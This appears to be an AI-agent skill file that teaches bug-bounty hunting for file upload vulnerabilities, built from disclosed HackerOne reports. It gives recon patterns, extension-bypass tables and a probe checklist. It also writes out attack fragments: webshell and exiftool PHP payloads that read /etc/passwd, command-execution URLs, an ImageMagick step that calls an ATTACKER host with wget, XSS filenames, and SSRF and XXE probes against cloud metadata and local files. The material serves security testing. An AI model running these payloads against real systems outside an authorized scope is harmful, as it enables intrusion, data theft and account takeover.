---
name: hunt-upload
description: "Hunting skill for FILE UPLOAD vulnerabilities, built by mining 112 full disclosed HackerOne report texts (145-report corpus). Covers the full impact spectrum seen in the wild: RCE via webshell/ImageMagick MVG/FFmpeg/SQLite-JDBC (Semrush #403417, Starbucks #506646, HackerOne #135072, Aiven #1547877, DoD #2054184), stored/blind XSS via SVG/HTML/PNG-metadata/filename (CS Money #1010466, GitLab #880099, Shopify #964550, Nextcloud SVG chain), SSRF via upload-from-URL and parser-URL fetches (HackerOne #713, Discourse #228377, Shopify #97501, DoD #1691501), path traversal / arbitrary file overwrite (Mail.ru #671605, express-cart #343726), XML/XXE through SVG and DOCX (Lab45 #845832, Informatica #105787), and access-control/CSRF/idor failures on upload endpoints (Basecamp #1020371, Rocket.Chat #501084, HackerOne #2450215). Use when testing any /upload, /avatar, /import, /attachment, /avatar-from-URL, image/video processor, file manager, or theme-logo endpoint. Frequency-led recon (file-upload 101/112, image-processing 69, search-filter-sort 31), 18 verbatim discovery clues, a 15-probe checklist, bypass tables, and a strict Gate 0: an uploaded-but-never-executed/served/parsed file is NOT a finding."
sources: hackerone_public, github, public_research, cve_database, owasp
report_count: 145
full_reports_read: 112
---

## Crown Jewel Targets

File upload is a vulnerability *class*, not a single bug. The severity is decided by what happens to the bytes **after** they land — whether the file is served back on a live origin, executed by an interpreter, parsed by a powerful processor, or written to an attacker-influenced path. The same "unrestricted upload" can be a $100 informational report or a critical RCE depending entirely on that post-upload fate. Priority targets, grounded in the 112 reports:

- **Image / avatar / profile-photo upload endpoints.** This is the single most-mined surface: 101 reports carry the `file-upload` signal and 69 carry `image-processing`. Semrush's report-constructor logo upload (#403417) reached an unpatched ImageMagick and gave RCE through PostScript/Ghostscript; HackerOne's profile-picture upload at `/settings/profile/edit` (#135072) fed an ASCII file to ImageMagick as MVG and got command execution; Shopify's avatar upload (#964550) accepted a PNG whose EXIF comment carried JavaScript. Every "upload your picture" flow is a candidate — treat it as high-value by default.

- **Any endpoint that fetches the file from a URL the user controls.** "Upload from URL", "import by link", "avatar from URL", gravatar-style `url=` parameters are dual upload+SSRF primitives. #713 changed an `<input type=file>` to `type=url` and wrote an arbitrary remote URL as the profile photo. #228377 (Discourse, PM image markdown), #158016 (Instacart `list[remote_image_url]`), #1691501 (DoD image URL downloader with `file=http://127.0.0.1/test.png`), #549882 (Vimeo) and #296045 (Open-Xchange VCARD photo) all leaked internal network data through this exact pattern.

- **Server-side image/video/HTML processors.** Image processing is the #2 signal (69). Thumbnail generation, format conversion, resize, PDF/screenshot export, transcoding. #1062888 (TikTok) and the Pornhub family (#570537, #574133, #574134) got external SSRF + local file read from FFmpeg HLS/concat processing of an uploaded video; #97501 (Shopify) got SSRF from an SVG `<image xlink:href>` resolved by the server-side SVG parser; Mattermost (#1620170) OOM'd a server with a max-dimension GIF.

- **SVG-accepting upload paths.** 16 reports carry `svg-upload` and 16 carry `xml-parser`. SVG is XML that browsers *execute* when served inline and that XML parsers *resolve* server-side — a double primitive. GitLab #880099 (JS in a PNG-named SVG in a wiki), Palo Alto #765679 (SVG renamed to png/gif/bmp → cookie theft), the Nextcloud chain #894876 → #998422 (SVG-as-PNG XSS and open redirect), Concrete CMS #437863, Moneybird #130591, and Lab45 #845832 (SVG → XML injection → XXE) are all represented.

- **Theme / logo / branding uploaders.** Often restricted to admins and missing file-type validation entirely. Nextcloud #231524 (`/theming/ajax/updateLogo`, HTML uploaded as logo → stored XSS) and #155690 (Logo & Log in image theming → arbitrary HTML file write into `../data/themedinstancelogo`) are canonical; both prove that "admin-only" does not mean "safe".

- **File managers, import/extract endpoints, and debug/admin pages.** ZIP/TAR extraction (zip-slip, symlink), archive imports, and no-auth debug uploaders. #698789/#698793 (unauthenticated `/upload.php`), #1714767 (no-access-control debug page that uploads, reads and deletes files), #343726 (express-cart admin upload to ANY path), #683965 (Nexus writes a PE executable into the Windows Startup folder as SYSTEM → RCE at next login).

- **Chat / chat-window / attachment / support-ticket uploads.** Shared surfaces mean stored XSS reaches other users. OWOX #925513 (.rb/.php sent in a chat window), CS Money #1010466 (support-chat file upload XSS planted in the `filename` param), Mail.ru shell uploads (#317043, #369557), DNN's unauthenticated HTML editor provider (#3414079, CVE-2025-64095), and Dust #3115705 (workspace file → full workspace takeover).

- **S3 / object-storage-backed uploads with presigned URLs and transformation pipelines.** Direct-upload endpoints, mutable content-type headers, and post-upload transformations. Reddit #1276733 (open S3 bucket with public upload), Radancy #2007235 (any uploaded file viewable with a single link), Mozilla #1984060 (private file becomes public via transformations), Rails ActiveStorage #789579 (unsigned content-length), Uber #126374 (plain text uploaded to S3 through a driver document page).

- **Uploads with access-control gaps.** Ability to upload as/for another user, after a ban, before 2FA, or cross-scope. Basecamp #1020371 (post-closure ActiveStorage uploads), Rocket.Chat #501084 (`ufsImportURL` with another `userId`), GitLab #1112297 (Reporter uploads Design files via "Move to"), Valve #354660 (banned user UGC upload), CS Money #1080839 (upload backgrounds before completing 2FA), HackerOne #2450215 / #419896 (upload attachments to another user's scoping form / report draft).

Payouts are highest when upload chains to **OS command execution** (Semrush, Starbucks, HackerOne, Aiven, DoD), **cloud/internal SSRF** with data returned (Vimeo, TikTok), or **stored XSS on a shared/public same-origin surface** that steals a privileged session (CS Money, GitLab, Palo Alto, Dust). Note the frequency signal `stored` (14) and `admin-internal` (14) — persistence and privileged context are what convert a file-write into a high-severity finding.

### Severity Decision Tree (apply before you invest hours)

- **File never served, executed, or parsed?** → Informational at best. Close it or keep hunting. This is the #1 triage rejection for "unrestricted upload" reports (#808287, #463604, #1644062 were accepted mostly as business-logic/low severity).
- **File served back with a dangerous MIME/handler on a shared origin?** → Stored XSS / possible RCE. Confirm execution in a second account to raise severity (#880099, #765679, #3115705).
- **File reaches an interpreter (ImageMagick, FFmpeg, XML parser, PHP/ASP.NET/JSP handler)?** → RCE / SSRF / XXE. Prove it with command output, a callback, or a file read (#403417, #1062888, #845832).
- **URL the server fetches is attacker-controlled?** → SSRF. Establish blind vs full-read; full-read of cloud metadata is critical (#158016, #549882, #1547877).
- **Path/key/user-id the server writes to is attacker-controlled?** → Arbitrary write / overwrite / IDOR (#671605, #343726, #501084).
- **Only thing missing is validation, but no impact hop?** → Low/informational. Do not overstate.

### What Is NOT a Crown Jewel

- A file that uploads successfully but returns 404 when requested — unless you can locate it via a timestamp, listing, or path guess (#357858 found files by grepping the response timestamp; #698789 used a predictable `/delete.me` path).
- A `.php` file the server returns as plain text — Nextcloud #155690 explicitly noted *"I tried to upload an php file but server executed that file as text"*; that uploader's impact was HTML, not RCE.
- "Could not execute code" admissions — #463604: *"I could not execute code through this, but i thought it was a valid report."* Such reports are usually low severity; find the execution/serving hop before calling it critical.
- Uploads that only enable malware hosting or storage abuse without execution — typically low (Nextcloud #808287 CVSS 2.6, Linktree #1644062), unless a victim is actually harmed.

---

## Attack Surface Signals

### Endpoint / URL Patterns to Hunt
```
/upload, /uploads, /upload.php, /upload_file, /file-upload, /direct_uploads
/avatar, /profile-picture, /profile-photo, /photoUploadUrl, /change-avatar
/attachment, /attachments, /import, /extract, /unzip, /filebox_upload_file
/api/*/upload, /api/*/image, /api/*/import, /api/*/photo, /api/*/files
/my_reports/*/upload, /my-posts/api/image/upload, /theming/ajax/updateLogo
/recruitjob/*hx_filebox_upload_file, /repo/*repo.asp?fileToUpload=
/settings/profile/edit, /members/*/profile/change-avatar
/debug (upload/read/delete), /upload.php, /delete.me
```

Concrete examples from the reports:
- `POST /rails/active_storage/direct_uploads` — Basecamp #1020371.
- `/settings/profile/edit` — HackerOne #135072 (ImageMagick RCE).
- `https://www.semrush.com/my_reports/constructor` — #403417 (logo upload).
- `/my_reports/api/v1/upload/image` — Semrush #748903.
- `/my-posts/api/image/upload/?CKEditor=...&CKEditorFuncNum=...` — Semrush #375352 (reflected XSS in the error path).
- `/index.php/apps/theming/ajax/updateLogo` served at `/index.php/apps/theming/logo` — Nextcloud #231524.
- `/ Umbraco/Api/ContactApi/SaveAttachment` — #3765476 (unauth + CORS wildcard).
- `POST /repo/orbital/repo.asp?fileToUpload=pizza.asp` — DoD #2054184 (null byte).

### Parameter / Field Signals (in requests and JS bundles)
```
filename= (attacker-controlled name — XSS/traversal/null-byte sink)
name="myfile"; filename="poc.asp.png"     # multipart Content-Disposition
file=          # URL downloader: file=http://127.0.0.1/test.png
url= / remote_image_url= / image_url= / gravatar url=   # URL fetch SSRF
contentType=   # presigned-URL content type: image/svg+xml, text/html
set= / imgnum= / repo_id= / personId= / userId= / itemid=  # IDOR on upload
fileToUpload= / accepted_types[]= / maxbytes= / byte_size=
CKEditorFuncNum=  # reflected into error message → XSS
```

Why each matters, from the data:
- `filename=` is the XSS/traversal sink in #1010466 (`"><img src=1 onerror=...>`), #203515 (oversized filename in error), #179695 (leading unicode).
- `file=` / `url=` / `remote_image_url=` are the SSRF sinks in #1691501, #713, #158016.
- `contentType=` drives the presigned S3 URL in #845832 — changing it to `image/svg+xml` enabled XXE.
- `userId=` / `personId=` / `set=` / `imgnum=` are the authorization and overwrite sinks in #501084, #741683, #401483, #259913.

### Content-Type / Multipart Signals
```
Content-Type: multipart/form-data; boundary=...
Content-Type: text/html; charset=<html><script>...</script>...</html>
X-Requested-With: XMLHttpRequest   (CSRF-relevant upload flows)
Missing CSRF token / Origin / Referer on upload POST
```
#20720 (Mail.ru) injected `<script>` through the `charset` portion of the `Content-Type` header itself; #964550 changed the multipart part's `Content-Type` from `image/png` to `text/html`; #401483 and #3765476 show upload POSTs with no CSRF token and permissive CORS.

### Tech-Stack Signals
- **ImageMagick / GraphicsMagick** — MVG, PostScript/EPS, SVG handling; ImageTragick-era policy.xml gaps (#403417, #135072).
- **FFmpeg** — HLS `.m3u8` playlists, `concat:` demuxer, remote segment fetches (#1062888, #570537).
- **Headless Chrome / PDF generators** — HTML→PDF, screenshot services, report exporters (also a `server-side-rendering` signal, 24).
- **Node/Express, PHP, ASP.NET, Rails ActiveStorage, Python** — handler execution in the upload directory; note #343726 (express-cart) and #683965 (Nexus on Windows/SYSTEM).
- **S3 / GCS / GridFS object storage** — presigned PUTs, transformations, public bucket misconfig (#501084 GridFS, #1276733 S3).
- **XML/ZIP-based office formats** — DOCX/XLSX/SOAP/SVG → XXE and zip-slip (#845832, #105787).

### Response / Behavior Signals
- Upload succeeds with no validation error for disallowed extensions (.php, .html, .svg, .exe, .docx) — #722919, #463604, #1606957.
- Uploaded file is retrievable at a predictable URL (`/uploads/<user><timestamp>.php`, `/delete.me`) — #357858, #698789.
- 500 error after upload but the file still lands — grep the timestamp to locate it (#357858).
- Different response sizes/status for internal vs external URLs in a URL-fetch field — #158016 leaked an OpenSSH banner from `127.0.0.1:21`.
- A server-side callback from an `<image xlink:href>` or external entity to your listener — #97501, #1062888.
- Error messages echo the filename unsanitized ("file too large") — #203515, #263109.

### Quick Subclass → Signature → Kill Chain Table

| Subclass | Signature in the request / response | Kill chain to prove | Representative reports |
|---|---|---|---|
| Webshell RCE | `.php`/`.asp(x)`/`.jsp` accepted, file retrievable at predictable URL | Upload → direct request → command output | #357858, #506646, #2054184, #1027822 |
| Processor RCE | ASCII text accepted as `.gif`/`.jpg`; ImageMagick/FFmpeg fingerprint | Upload → parser → reverse shell / command | #403417, #135072 |
| Stored XSS (SVG/HTML) | SVG/HTML accepted, served inline, no `Content-Disposition` | Upload → victim views URL → script fires | #880099, #765679, #130591, #3115705 |
| Metadata XSS | EXIF/comment fields reflected in preview | Embed script in metadata → render | #964550, #357858 |
| Filename XSS | `filename=` reflected in error/DOM | Payload in name → error message triggers | #1010466, #203515, #179695, #375352 |
| Upload-from-URL SSRF | `url=`/`file=`/`remote_image_url=` fetched server-side | Collaborator → internal IP → metadata/creds | #713, #228377, #158016, #1691501, #549882 |
| Parser SSRF/XXE | SVG `xlink:href`, DOCX external DTD, FFmpeg HLS/concat | Upload → parser fetch → callback/file read | #97501, #845832, #1062888, #897244 |
| Arbitrary write / overwrite | Path/filename/key/user-id controllable | Upload → write outside dir / overwrite | #671605, #343726, #683965, #741683 |
| Access-control / state | Upload works after logout/ban/before 2FA or as another user | Replay request → unauthorized write | #1020371, #501084, #1080839, #2450215 |
| CSRF / CORS | Multipart POST without token; `ACAO: *` | Cross-origin form → silent upload | #401483, #3765476 |
| Storage exposure | Presigned URL, public bucket, transformation endpoint | Fetch object / transform private file | #1276733, #2007235, #1984060, #789579 |
| DoS / resource | No size/dimension checks | Giant file / max-dimension GIF → OOM | #19532, #1620170, #259913 |

---

## Discovery Patterns From 112 Full Reports

### Where Researchers Start (ranked recon surfaces — "what to look for")

1. **Enumerate every file-input and "upload" control in the app — then fuzz for hidden ones.** The #1 discovery move. Look for multipart POSTs in Burp history, `<input type=file>` in the DOM, and endpoints absent from the UI. #2054184: *"I found 'repos' ... which doesn't have the file upload functionality appearing on the DOM, but it still may be there ... I had to fuzz a lot to find these."* #698789: *"I was able to identify unsafe upload endpoint on the https://█████/upload.php."* What to look for: orphan upload handlers, old `/upload.php`, debug pages, admin-only import forms, and files in `/robots.txt` or JS bundles.

2. **The avatar / profile / logo upload flow.** Highest-yield single feature. #964550: *"I found unrestricted file upload via avatar in https://accounts..."*; #155690: *"I saw that Logo & Log in image allow to upload other files type example \* ... I tried to upload an php file but server executed that file as text."* What to look for: file-type enforcement that exists only client-side, an allowlist you can evade with extension/MIME tricks, and whether the stored avatar is served on a same-origin URL.

3. **"Upload from URL" / image-by-link / gravatar fields.** Dual SSRF+LFI primitive. Inspect `type=file` → change to `type=url` (#713); look for `url=` on "no photo"/gravatar options (#463604): *"Choose 'gravatar' option and change the 'url' parameter to anything you would like."* What to look for: any parameter whose value is fetched server-side; test `127.0.0.1`, link-local metadata, and your Collaborator.

4. **Chat, support ticket, attachment, and comment file uploads.** Shared surfaces mean stored XSS hits other users. #1010466 uploaded to a support chat and planted XSS in the `filename` param; #3115705 uploaded a file into a workspace and got full workspace takeover when a victim viewed it; #925513 uploaded `.rb`/`.php` into a chat window. What to look for: where the uploaded file is displayed, to whom, and whether it is sandboxed.

5. **Image/video processing pipelines.** Look for thumbnail generation, format conversion, resize, PDF/screenshot export, and transcoding. #403417's logo was passed to ImageMagick; #135072's profile pic became MVG. What to look for: processor fingerprinting (error strings, behavior at `/settings/profile/edit`), and whether ASCII text is parsed as an image format. #1691501 explicitly notes the researcher identified `libcurl` in the stack.

6. **JS/source and public-code review.** 9 reports used `js-source-review`, 8 used `public-code-search`. #501084 found `ufsImportURL` addressable with another `userId` by reading source; #845832 observed a `contentType` param driving the S3 presigned URL; #504600: *"I noticed that in the augur-app readme, you pull an image from a bucket called 'nasacso'."* What to look for: client-side allowlists, presigned-URL construction, hidden method names, and README/bucket-name leaks.

7. **After-state / account-state gaps.** Replay captured upload requests in unusual account states. #1020371 replayed `POST /rails/active_storage/direct_uploads` from a closed account; #1080839 uploaded before completing 2FA; #354660 uploaded as a banned/UGC-banned user. What to look for: upload endpoints that don't re-check auth state at execution time.

8. **Object storage & CDN misconfig tied to uploads.** #1276733: *"Found a s3 bucket that belongs to studio ... Now I tried to upload by using command in authenticated AWS CLI Machine."* #504600 found a public-write bucket. What to look for: presigned URL scope, bucket ACLs, direct object URLs, and transformation endpoints that flip private→public (#1984060).

9. **Metadata / derived-data surfaces.** EXIF/comment fields and error messages are unsanitized sinks. #964550 injected XSS via `exiftool -Comment`; #357858 embedded a PHP shell in `-DocumentName`; #45368 put XSS in a video filename supplied over FTP. What to look for: any place the filename or metadata is echoed into HTML or a DOM error message.

### Feature-Based Discovery Signals (frequency-ranked)

Signal counts are the number of the 112 full reports containing each tag (multiple tags per report). The top signals tell you where researchers actually find bugs.

| Rank | Signal (count) | Why it matters / what to probe |
|---|---|---|
| 1 | file-upload (101) | The core surface. Probe every upload POST for extension, MIME, magic-byte, size, and filename validation; replay with .php/.asp/.html/.svg/.exe. |
| 2 | image-processing (69) | Files get parsed by powerful libs. Probe ImageMagick MVG/PS, FFmpeg HLS/concat, malformed dimensions, polyglots. |
| 3 | search-filter-sort (31) | Often co-occurs with allowlist/filter logic. Probe filter-bypass variants, extension denylists, and filename normalization. |
| 4 | server-side-rendering (24) | HTML/PDF renderers fetch and execute. Probe `<iframe>`, `@import`, `<script src>` in uploaded/rendered content. |
| 5 | cookie-handling (23) | Stored XSS → cookie theft. Probe SVG/HTML upload served same-origin; check session cookie flags. |
| 6 | redirect-handling (19) | Upload-then-redirect and open-redirect in served files (#998422). Probe redirects and bypassed post-upload checks (#683957). |
| 7 | internal-network (18) | Upload/URL-fetch reaches internal services. Probe 127.0.0.1, link-local, Jolokia (#1547877), SSH banners (#158016). |
| 8 | comment-injection (18) | Metadata/comment fields carry payloads. Probe exiftool `Comment`/`DocumentName` XSS (#964550, #357858). |
| 9 | filter-bypass (18) | Upload filters are routinely bypassable. Probe double-ext, null byte, case, trailing space (#506646), PNG extension on SVG (#998422). |
| 10 | xml-parser (16) | XML in SVG/DOCX → XXE/SSRF. Probe external entities and `xlink:href` (#845832, #97501). |
| 11 | svg-upload (16) | SVG is active content. Probe `<script>`, `onload`, embedded HTML, external refs. |
| 12 | session-attack (16) | Upload surfaces tie to session/privilege. Probe ATO via stored XSS and cross-user uploads. |
| 13 | api-endpoint (15) | REST upload APIs often miss CSRF/authz. Probe direct API calls and IDOR params. |
| 14 | cache-layer (14) | CDN/cache can persist malicious files. Probe invalidation and public exposure. |
| 15 | stored (14) | Persistence is what makes XSS severe. Confirm the file is served to other users. |
| 16 | admin-internal (14) | Admin-only uploaders often unvalidated. Probe theme/logo/debug uploaders. |
| 17 | url-fetching (12) | Server-side fetch of uploaded URL → SSRF. Probe Collaborator + metadata endpoints. |
| 18 | proxy-feature (9) | Proxy/upload resume logic has TOCTOU and path bugs (#3432833, #3776433). Probe race windows and resume offsets. |
| 19 | js-source-review (9) | Client code reveals hidden methods/allowlists. Grep bundles for upload logic. |
| 20 | dos-resource (9) | No size/dimension checks → OOM/DoS. Probe giant files and max-dimension GIFs (#1620170, #19532). |
| 21 | path-traversal-lfi (7) | Attacker-controlled path/filename → arbitrary write/read. Probe `../../`, `imgnum`, `overrideLocalStorageUrl`. |
| 22 | csrf (7) / cors-misconfig (7) | Upload POSTs without CSRF/CORS controls (#401483, #3765476). Probe cross-origin forms. |
| 23 | subdomain (5) / subdomain-takeover (5) | Upload endpoints on forgotten subdomains (stripo.email, 3d.cs.money, studio.redditinc.com). Enumerate subdomains. |
| 24 | command-injection (5) / debug-error-leak (5) | Processors and error paths yield RCE/path disclosure (#135072, #20616). Probe error strings. |
| 25 | open-redirect (4) / misconfiguration (4) / import-feature (4) / template-injection (4) | Served files that redirect, misconfigured handlers, import flows, template rendering. |
| 26 | blind-oob (3) / cloud-metadata (2) / null-byte (2) / race-condition (1) / xxe (1) / mutation-polyglot (1) / unicode-normalization (1) | Low-frequency, high-impact special cases. Probe nulls, external DTDs, polyglots, leading unicode, and TOCTOU windows. |

### Verbatim Discovery Clues (18 real "how I found it" quotes)

- [#403417] *"The Logo upload in the report constructor ... is passed through a not properly patched version of ImageMagick. You can use Postscript to get Ghostscript to run which in return allows to trigger arbitrary commands on the server."*
- [#1010466] *"The CSRF vulnerability make a request for support.cs.money/upload_file; This upload_file does not have csrf token ... The XSS allows to execute JS. The payload of the XSS stay in the param 'filename'."*
- [#964550] *"I found unrestricted file upload via avatar in https://accounts.shopify.com/accounts/<ID>, and XSS Stored in PNG IDAT chunks using exiftool."*
- [#2054184] *"I found that if you place a null byte between file extensions, you can upload files with malicious extensions."*
- [#880099] *"i found that i can upload png file with JavaScript code and execute it in wiki page."*
- [#412481] *"During the test, I found ecjobsdc.starbucks.com.cn this site has an upload vulnerability, you can upload html and shtml format files."*
- [#722919] *"i found an Unrestricted File Upload on https://app.lemlist.com which let me upload anything."*
- [#463604] *"Have found a way to upload files that aren't images ... Choose 'gravatar' option and change the 'url' parameter to anything you would like."*
- [#698789] *"I was able to identify unsafe upload endpoint on the https://█████/upload.php ... Visit /delete.me and you will see your uploaded file there."*
- [#1691501] *"I found Blind SSRF on one domain from Hack US program ... Also I was able to identify that your web app is using libcurl."*
- [#845832] *"I observed that when uploading a user avatar picture, the first request was sent to ... photoUploadUrl with a POST parameter 'contentType' ... I changed the value to 'image/svg+xml'."*
- [#97501] *"Uploading SVG that include <image xlink:href='http://example.com/?evil=var' /> will cause the server side parser to try to fetch external resources."*
- [#506646] *"I found that users can upload asp/aspx and other dynamic files via the avatar upload function when adding a space character behind the file type to bypass the upload file limit."*
- [#357858] *"Find a nice picture and embed the shell into the image like this exiftool -documentname='<?php echo file_get_contents(\"/etc/passwd\"); ?>' picture.png ... Rename the jpg/png picture to the .php extension."*
- [#158016] *"There is a Server-side request forgery when updating the image for a list ... Change the url to http://127.0.0.1:21 ... 'wrong status line: SSH-2.0-OpenSSH_6.6.1p1 Ubuntu'."*
- [#1714767] *"I found a debug page with no access control that allows: Uploading files. Reading files if they are in JSON format. Delete files."*
- [#2450215] *"in my recent testing i found that any users could upload attachments to any users pentest scoping form without having access to it as long as they have the scope id."*
- [#1276733] *"Found a s3 bucket that belongs to studio ... Now I tried to upload by using command in authenticated AWS CLI Machine."*

### Probe Checklist (15 concrete probes)

1. **Wildcard first upload** — submit `shell.php`, `shell.asp(x)`, `shell.jsp`, `shell.phtml`, `test.html`, `test.svg`, `test.exe` to every upload endpoint; record which are accepted and where they are served. (#722919, #463604, #925513)

2. **Double / trailing extension** — `shell.php.jpg`, `shell.jpg.php`, `shell.asp.png`, and a **trailing space** `shell.asp ` (#506646); check if the last-vs-first extension is validated.

3. **Null byte** — `poc.asp%00.png` / `shell.php\0.jpg` (#2054184, Mail.ru #20616 whose filename hex ends `...0074`); check whether the server truncates at the null.

4. **MIME vs magic-byte mismatch** — set `Content-Type: image/jpeg` while body is PHP/HTML (#964550, #97672); then prepend magic bytes `GIF89a;` / `89 50 4E 47` to a script (polyglot).

5. **Case & alias extensions** — `.pHp`, `.PhP`, `.php5`, `.pht`, `.phtml`, `.shtml`, `.svgz`; check handler mapping — note #155690 where `.php` ran as text but other handlers executed.

6. **SVG active content** — `<svg onload=alert(1)>`, embedded `<html>/<script>`, `<image xlink:href="http://COLLAB/x">` (#437863, #97501); then rename to `.png` (#998422, #894876).

7. **Metadata injection** — `exiftool -Comment="...<script>..."`, `-DocumentName='<?php ... ?>'` (#964550, #357858); check if metadata is rendered in the served image or a preview page.

8. **Filename-as-XSS sink** — put `"><img src=1 onerror=...>` in the `filename=` field (#1010466); also oversized filenames with payloads that hit "file too large" error interpolation (#203515, #263109) and leading unicode (#179695).

9. **Upload-from-URL SSRF** — `url=http://127.0.0.1/test.png`, `file=http://COLLAB/`, `remote_image_url=http://169.254.169.254/...` (#1691501, #158016, #228377); verify with Collaborator and establish blind vs full-read.

10. **Parser-driven SSRF/XXE** — SVG external entity / `xlink:href`, DOCX `[Content_Types].xml` external DTD, FFmpeg `m3u8`/`concat:` pointing at internal URLs (#845832, #897244, #1062888).

11. **ImageMagick MVG / PostScript** — upload ASCII `push graphic-context ... image over ... \`wget\`` and `%!PS` Ghostscript payload (#135072, #403417).

12. **Path traversal / arbitrary write** — `../../` in filename/path, `overrideLocalStorageUrl`, user-controlled `imgnum`, symlink in TAR/ZIP (#343726, #683965, #671605, #259913).

13. **Access control on the upload endpoint** — replay the upload as another user (`userId`, `personId`), after logout/ban, before 2FA, without CSRF token, cross-origin form (#501084, #1020371, #1080839, #401483, #3765476).

14. **Storage/transformation exposure** — fetch the presigned URL directly, test public bucket listing, and apply transformations to a private file to check if it becomes public (#1276733, #2007235, #1984060, #789579).

15. **Resource exhaustion** — oversized uploads and max-dimension GIFs / 20MB filenames to test memory/DoS behavior (#19532 uploaded 2.52 GB with no warning; #1620170 used a max-dimension GIF to consume >4GB RAM).

### Negative Signals & Dead Ends (learned from closed/low reports)

- **"Server accepted the file" is not a signal on its own.** #808287 (Nextcloud contact image) and #463604 (auth.ratelimited.me) were low/informational precisely because the files were never executed. #722919 (lemlist) was rated medium mainly for defacement potential, not RCE.
- **Client-side-only blocks are a signal, but only if the server also fails.** #1606957 accepted a Follina `.docx` because the JS drag-drop check was bypassed by the browse dialog — but the impact depended on a support agent opening the file (low). Always trace to a victim.
- **A stored file on a low-privilege surface may not be high severity.** #603788 (ideas.browser.mail.ru) and #1005355 (Uber) were stored XSS reports whose impact hinged on where the file was displayed and who viewed it.
- **Do not double-count the same flaw.** The Nextcloud SVG XSS was a chain of #894876 → #998422 → broader bypasses; the later reports are explicitly "bypass #89487" and should be evaluated on their own added impact.
- **Stack mismatch wastes time.** #155690 showed PHP disabled (`.php` as text); hunting PHP RCE there would be futile — HTML write was the real impact. Fingerprint before choosing a payload family.
- **Bug bounty scope matters.** Several reports were accepted under extended scope (e.g., Mail.ru's pandao.ru in #671605, ideas.browser.mail.ru in #603788, Vimeo's related domains). Confirm the target is in scope before deep work.

---

## Step-by-Step Hunting Methodology

1. **Build an upload inventory.** Spider the app and JS bundles; list every multipart POST, "upload", "import", "avatar", "logo", "attachment", "from URL", and processor endpoint. Include endpoints not in the DOM — fuzz for hidden upload handlers (`.php`, `/upload`, `/debug`, `/import`) per #2054184 and #698789. Enumerate subdomains too: stripo.email, 3d.cs.money, studio.redditinc.com and ecjobs.starbucks.com.cn all hosted the vulnerable uploaders.

2. **For each endpoint, determine the post-upload fate of the bytes.** This decides severity. Ask concretely:
   - Is the file served back on a live origin? Returned in an `<img>`, `<iframe>`, or direct link?
   - Is it parsed by ImageMagick / FFmpeg / an XML parser?
   - Is it written to a controllable path (filename, folder, object key)?
   - Is it executed by the web server handler?
   - Never served or parsed = likely informational only (Gate 0). Write-only blobs are not findings.

3. **Map the validation layer.** Identify what is checked: extension (first/last/all), MIME header, magic bytes, file size, filename characters, content-type in presigned URL, auth/CSRF. Use the Probe Checklist to find the gap between what the front-end enforces and what the back-end does. #1606957: JS drag-drop blocked .docx but "Click to browse" did not; #964550: MIME edited after selection; #845832: `contentType` changed to `image/svg+xml`.

4. **Run the extension/MIME/magic bypass ladder.** Escalate from simple (.php as .jpg) to double-ext, null-byte, case variants, trailing space, `.shtml`, `.phtml`, polyglot, and metadata-embedded payloads. Record the exact HTTP request that succeeds — you will need it verbatim for the report.

5. **Test the "file is executed" hypothesis.** If a script lands, request it directly (`/uploads/shell.php?c=id`) and look for command output. The Semrush #403417 and Monero #357858 reports showed `ls` and `/etc/passwd` output; DoD #2054184 ran `dir` via `poc.asp?cmd=dir`. Command execution — not merely file presence — is the RCE proof. Note quirks: #357858 got a 500 but the file landed, located via the response timestamp.

6. **Test the "file is served as active content" hypothesis.** For SVG/HTML uploads, open the served URL in a browser and confirm script execution / cookie disclosure. Use a second account as the victim to prove stored XSS hits another user (Palo Alto #765679 used a two-account setup; Dust #3115705 required a victim in the same workspace). Check whether CSP blocks inline scripts — Rocket.Chat #1380157 bypassed CSP by uploading a `.js` file and including it with `<script src>`.

7. **Test the "file is parsed" hypothesis.** For image/video/XML processors, plant canaries: an SVG `xlink:href` or external entity to your Collaborator, an FFmpeg HLS/concat file referencing your listener, an MVG `image over ... \`wget\``. Confirm a callback or file read (Shopify #97501, TikTok #1062888, HackerOne #135072). The Shopify report showed the exact `nc` listener output proving the server fetched the external URL.

8. **Test upload-from-URL for SSRF.** Any URL-accepting field gets: your Collaborator (prove server-side fetch), `http://127.0.0.1:<port>` (error/banner leaks like the SSH banner in #158016), `169.254.169.254` (cloud metadata), and internal Jolokia-style endpoints (#1547877). Establish blind vs full-read before scoring.

9. **Test path control and storage boundaries.** Manipulate filename/path, `imgnum`, `userId`, presigned `contentType`, and folder params for traversal and overwrite. Try to write outside the upload dir — Mail.ru #671605 overwrote arbitrary S3 keys, express-cart #343726 uploaded to any path, Nexus #683965 wrote into the SYSTEM Startup folder.

10. **Test authorization/state.** Replay upload requests after logout, account closure, before 2FA, as a different user ID, and without CSRF tokens / with a cross-origin form (#1020371, #501084, #1080839, #401483, #3765476). For IDOR-style upload bugs, simply changing `userId` / `personId` is enough (#501084, #741683).

11. **Fingerprint and research the stack.** Error strings, response headers, and file extensions reveal ImageMagick/FFmpeg/PHP/ASP.NET/Rails. Check known CVEs and policy gaps for the exact version — Semrush #403417 cited Tavis Ormandy's guidance that policy.xml must disable EPS/PS; DNN #3414079 mapped to CVE-2025-64095.

12. **Chain.** Upload → RCE (webshell/MVG/SQLite-JDBC+Jolokia), upload → SSRF → metadata creds, upload → stored XSS → ATO/workspace takeover, upload → XXE → file read, upload → path traversal → defacement. Document every hop with screenshots.

13. **Apply Gate 0** before writing the report. Prove actual execution/serving/parsing and quantify victim loss. Only then submit, with a clean 10-minute reproduction that a second person can follow.

### Processor-Specific Playbooks

**ImageMagick / GraphicsMagick (#403417, #135072):**
- Test whether ASCII text is parsed as MVG by uploading a `push graphic-context` file named `.gif`/`.jpg`.
- Check policy.xml coverage — PostScript/EPS re-enables Ghostscript; the `%!PS` `%pipe%` trick executes shell commands.
- Prove with an outbound callback (`wget -O- ATTACKER:PORT`) or a reverse shell, not just a 500 response.

**FFmpeg / video processors (#1062888, #570537, #574133, #574134):**
- Upload an `.m3u8` HLS playlist whose segment URL is your Collaborator or `169.254.169.254`.
- Try the `concat:` demuxer with `file 'http://COLLAB/x'` — it fetches remote URLs regardless of the container extension.
- Confirm both external SSRF (callback) and local file read (file content in a generated thumbnail/metadata).

**SVG / XML parsers (#97501, #845832, #897244, #105787):**
- For SSRF: `<image xlink:href="http://COLLAB/">`; confirm the server-side GET in your listener (the Shopify report showed the raw `nc` output).
- For XXE: a DOCTYPE with an external entity pointing at `file:///etc/passwd` or an attacker DTD; test both in-band and OOB exfiltration.
- For stored XSS: `<script>`/`onload` in the SVG, then request the served file directly in a browser.

